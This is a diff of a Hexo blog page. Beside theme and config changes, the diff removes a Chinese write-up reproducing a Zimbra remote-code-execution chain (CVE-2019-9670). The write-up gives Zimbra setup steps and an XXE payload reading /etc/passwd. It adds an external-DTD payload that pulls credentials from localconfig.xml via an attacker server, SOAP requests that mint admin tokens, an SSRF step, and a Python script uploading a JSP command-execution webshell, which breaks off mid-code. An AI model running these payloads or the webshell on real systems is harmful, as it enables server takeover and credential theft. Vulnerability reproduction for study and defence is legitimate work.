@@ -2,9 +2,11 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 5.2.0">
+
+
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -13,19 +15,17 @@
 <link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"sunian19.github.io","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-  <meta name="description" content="环境搭建首先准备个ubantu 14.04服务器，换个更新源，更新下安装辅助包，执行以下命令来安装相应的包">
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="环境搭建 首先准备个ubantu 14.04服务器，换个更新源，更新下 安装辅助包，执行以下命令来安装相应的包">
 <meta property="og:type" content="article">
 <meta property="og:title" content="&#39;zimbra RCE环境搭建到复现再到exp编写&#39;">
 <meta property="og:url" content="https://sunian19.github.io/2020/07/04/zimbra-RCE%E5%A4%8D%E7%8E%B0%E5%88%B0exp%E7%BC%96%E5%86%99/index.html">
-<meta property="og:site_name" content="Sunian&#39;s Blog">
-<meta property="og:description" content="环境搭建首先准备个ubantu 14.04服务器，换个更新源，更新下安装辅助包，执行以下命令来安装相应的包">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="环境搭建 首先准备个ubantu 14.04服务器，换个更新源，更新下 安装辅助包，执行以下命令来安装相应的包">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a1.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a2.png">
@@ -45,89 +45,54 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/a16.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/a17.png">
 <meta property="article:published_time" content="2020-07-03T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-09-18T08:12:50.360Z">
-<meta property="article:author" content="素念">
+<meta property="article:modified_time" content="2020-09-18T08:12:52.000Z">
+<meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://sunian19.github.io/imgss/a1.png">
 
+
 <link rel="canonical" href="https://sunian19.github.io/2020/07/04/zimbra-RCE%E5%A4%8D%E7%8E%B0%E5%88%B0exp%E7%BC%96%E5%86%99/">
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
 
-  <title>'zimbra RCE环境搭建到复现再到exp编写' | Sunian's Blog</title>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2020/07/04/zimbra-RCE%E5%A4%8D%E7%8E%B0%E5%88%B0exp%E7%BC%96%E5%86%99/","path":"2020/07/04/zimbra-RCE复现到exp编写/","title":"'zimbra RCE环境搭建到复现再到exp编写'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'zimbra RCE环境搭建到复现再到exp编写' | zer0_c|imb's blog</title>
   
 
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?d70c2fd321d2281d853a9197812a8f28";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
 
 
 
   <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-    <a target="_blank" rel="noopener" href="https://github.com/sunian19" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
   <div class="site-meta">
 
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunian's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
   </div>
 
   <div class="site-nav-right">
@@ -138,263 +103,59 @@
 </div>
 
 
+
 <nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
-
 </nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
   <span class="search-icon">
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
            placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
-  <span class="popup-btn-close">
+  <span class="popup-btn-close" role="button">
     <i class="fa fa-times-circle"></i>
   </span>
 </div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
   </div>
 </div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2020/07/04/zimbra-RCE%E5%A4%8D%E7%8E%B0%E5%88%B0exp%E7%BC%96%E5%86%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/imgss/touxiang.jpg">
-      <meta itemprop="name" content="素念">
-      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunian's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          'zimbra RCE环境搭建到复现再到exp编写'
-        </h1>
-
-        <div class="post-meta">
-        
-    <i class="fa fa-thumb-tack"></i>
-    <font color="green">置顶</font>
-    <span class="post-meta-divider">|</span>
-
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-07-04 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-04T00:00:00+08:00">2020-07-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-18 16:12:50" itemprop="dateModified" datetime="2020-09-18T16:12:50+08:00">2020-09-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先准备个ubantu 14.04服务器，换个更新源，更新下<br>安装辅助包，执行以下命令来安装相应的包</p>
-<a id="more"></a>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libgmp10 libperl5.18 unzip pax sysstat sqlite3 dnsmasq wget</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a1.png"><br>配置hostname和DNS服务器</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hostname</span><br><span class="line">更改hostname为自己的域名，例如mail.test.com</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a2.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts 添加如下代码</span><br><span class="line">192.168.37.137(本机IP) mail.test.com mail</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a3.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;dnsmasq.conf 配置如下</span><br><span class="line"></span><br><span class="line">server&#x3D;192.168.37.137</span><br><span class="line">domain&#x3D;test.com</span><br><span class="line">mx-host&#x3D;test.com, mail.test.com, 5</span><br><span class="line">mx-host&#x3D;mail.test.com, mail.test.com, 5</span><br><span class="line">listen-address&#x3D;127.0.0.1</span><br><span class="line">配置完成后重启电脑，sudo reboot</span><br><span class="line">我这里是把它放在了519行，不过我感觉放哪儿都可以吧，2333</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a4.png"><br>我已经提前下载好了Zimbra8.5.0版本，直接用finalshell托上去就行<br>也可使用命令下载8.6.0版本<br><img src="/imgss/a5.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;files.zimbra.com&#x2F;downloads&#x2F;8.6.0_GA&#x2F;zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a6.png"></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd进去之后执行.&#x2F;install然后一路按y，可能会报错</span><br><span class="line">问题不大，删了就行</span><br><span class="line">apt-get remove postfix</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a7.png"><br>这里不需要zimbra-dnscache，因为我们上边使用的是dnsmasq，所以不需要此包<br>之后一路按y即可，安装可能需要些时间<br><img src="/imgss/a8.png"><br>可能会提示配置MX记录，no即可</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DNS ERROR resolving MX for mail.test.com</span><br><span class="line">It is suggested that the domain name have an MX record configured in DNS</span><br><span class="line">Change domain name? [Yes] no</span><br></pre></td></tr></table></figure></div>
-<p>带星号的为必填，设置一下就OK</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">******* +Admin Password                        UNSET</span><br></pre></td></tr></table></figure></div>
-<p>设置好密码之后选25填写许可证，这里随便个/etc/passwd就行</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter the name of the file that contains the license: &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></div>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*** CONFIGURATION COMPLETE - press &#39;a&#39; to apply</span><br><span class="line">Select from menu, or press &#39;a&#39; to apply config (? - help) a</span><br><span class="line">Save configuration data to a file? [Yes] yes</span><br><span class="line">Save config in file: [&#x2F;opt&#x2F;zimbra&#x2F;config.38577] </span><br><span class="line">Saving config in &#x2F;opt&#x2F;zimbra&#x2F;config.38577...done.</span><br><span class="line">The system will be modified - continue? [No] yes</span><br></pre></td></tr></table></figure></div>
-<p>如果期间报错，直接回车即可<br>使用su - zimbra命令切换用户<br>zmcontrol status查看zimbra服务器状态<br><img src="/imgss/a9.png"><br>访问IP:7071端口，跳转zimbra管理页面<br><img src="/imgss/a10.png"></p>
-<h2 id="利用XXE-SSRF组合拳RCE复现"><a href="#利用XXE-SSRF组合拳RCE复现" class="headerlink" title="利用XXE+SSRF组合拳RCE复现"></a>利用XXE+SSRF组合拳RCE复现</h2><h3 id="第一步，测试是否存在CVE-2019-9670-XXE漏洞"><a href="#第一步，测试是否存在CVE-2019-9670-XXE漏洞" class="headerlink" title="第一步，测试是否存在CVE-2019-9670 XXE漏洞"></a>第一步，测试是否存在CVE-2019-9670 XXE漏洞</h3><p>POST请求/Autodiscover/Autodiscover.xml</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line"> &lt;Autodiscover xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;responseschema&#x2F;2006a&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">      &lt;EMailAddress&gt;aaaaa&lt;&#x2F;EMailAddress&gt;</span><br><span class="line">      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;&#x2F;AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;&#x2F;Request&gt;</span><br><span class="line">  &lt;&#x2F;Autodiscover&gt;</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a11.png"></p>
-<h3 id="第二步，读取zimbra用户账号密码"><a href="#第二步，读取zimbra用户账号密码" class="headerlink" title="第二步，读取zimbra用户账号密码"></a>第二步，读取zimbra用户账号密码</h3><p>成功读到用户密码，说明XXE验证成功<br>接下来构造payload读zimbra的配文件localconfig.xml<br>由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取，由于XXE不能内部实体进行拼接，所以此处需要使用外部dtd：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:..&#x2F;conf&#x2F;localconfig.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#39;%start;%file;%end;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>
-<p>POST请求/Autodiscover/Autodiscover.xml</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE Autodiscover [</span><br><span class="line">        &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;公网服务器&#x2F;dtd&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">        %all;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;Autodiscover xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;exchange&#x2F;autodiscover&#x2F;outlook&#x2F;responseschema&#x2F;2006a&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">        &lt;EMailAddress&gt;aaaaa&lt;&#x2F;EMailAddress&gt;</span><br><span class="line">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;&#x2F;AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;&#x2F;Request&gt;</span><br><span class="line">&lt;&#x2F;Autodiscover&gt;</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a12.png"></p>
-<h3 id="第三步，利用获取到的密码获取低权限token"><a href="#第三步，利用获取到的密码获取低权限token" class="headerlink" title="第三步，利用获取到的密码获取低权限token"></a>第三步，利用获取到的密码获取低权限token</h3><p>POST请求/service/soap或/service/admin/soap</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Envelope xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2003&#x2F;05&#x2F;soap-envelope&quot;&gt;</span><br><span class="line">   &lt;soap:Header&gt;</span><br><span class="line">       &lt;context xmlns&#x3D;&quot;urn:zimbra&quot;&gt;</span><br><span class="line">           &lt;userAgent name&#x3D;&quot;ZimbraWebClient - SAF3 (Win)&quot; version&#x3D;&quot;5.0.15_GA_2851.RHEL5_64&quot;&#x2F;&gt;</span><br><span class="line">       &lt;&#x2F;context&gt;</span><br><span class="line">   &lt;&#x2F;soap:Header&gt;</span><br><span class="line">   &lt;soap:Body&gt;</span><br><span class="line">     &lt;AuthRequest xmlns&#x3D;&quot;urn:zimbraAccount&quot;&gt;</span><br><span class="line">        &lt;account by&#x3D;&quot;adminName&quot;&gt;zimbra&lt;&#x2F;account&gt;</span><br><span class="line">        &lt;password&gt;上一步得到密码&lt;&#x2F;password&gt;</span><br><span class="line">     &lt;&#x2F;AuthRequest&gt;</span><br><span class="line">   &lt;&#x2F;soap:Body&gt;</span><br><span class="line">&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>
-<p><img src="/imgss/a13.png"></p>
-<h3 id="第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token"><a href="#第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token" class="headerlink" title="第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token"></a>第四步，利用SSRF漏洞通过proxy接口，访问admin的soap接口获取高权限Token</h3><p>POST请求/service/proxy?target=<a target="_blank" rel="noopener" href="https://127.0.0.1:7071/service/admin/soap">https://127.0.0.1:7071/service/admin/soap</a><br>我这里可能环境有问题，没有使用SSRF直接请求/service/admin/soap即可获取高权限token</p>
-<p>注意：<br>Host:后面加端口7071<br>Cookie中设置Key为ZM_ADMIN_AUTH_TOKEN，值为上面请求所获取的token<br>发送同上Body内容，但是AuthRequest的xmlns要改为：urn:zimbraAdmin，否则获取的还是普通权限的Token<br><img src="/imgss/a14.png"></p>
-<h3 id="第五步，利用高权限token传文件getshell"><a href="#第五步，利用高权限token传文件getshell" class="headerlink" title="第五步，利用高权限token传文件getshell"></a>第五步，利用高权限token传文件getshell</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PY"><figure class="iseeu highlight /py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file= &#123;</span><br><span class="line"><span class="string">&#x27;filename1&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;whocare&quot;</span>,<span class="literal">None</span>),</span><br><span class="line"><span class="string">&#x27;clientFile&#x27;</span>:(<span class="string">&quot;sunian.jsp&quot;</span>,<span class="string">r&#x27;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1)&#123;out.println(new 